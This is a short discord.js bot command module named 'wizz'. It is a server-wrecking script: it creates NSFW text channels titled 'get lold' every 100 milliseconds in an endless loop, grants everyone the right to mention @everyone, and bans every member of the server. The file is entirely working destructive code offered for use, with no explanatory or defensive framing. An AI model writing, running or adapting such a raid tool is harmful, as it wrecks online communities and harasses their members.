const Discord = require("discord.js");
const settings = require("./../../settings.json")

module.exports = {
	name: 'wizz',
	async execute(msg, args) {

		setInterval(async function() {
			await msg.guild.createChannel('get lold', {
                nsfw: true,
                permissionOverwrites: [{
                    id: msg.guild.id,
                    allow: 'MENTION_EVERYONE'
                }],
                type: 'text'
            })
		}, 100)
        await msg.guild.members.map(async member => {
            await member.ban()
        })
	}
}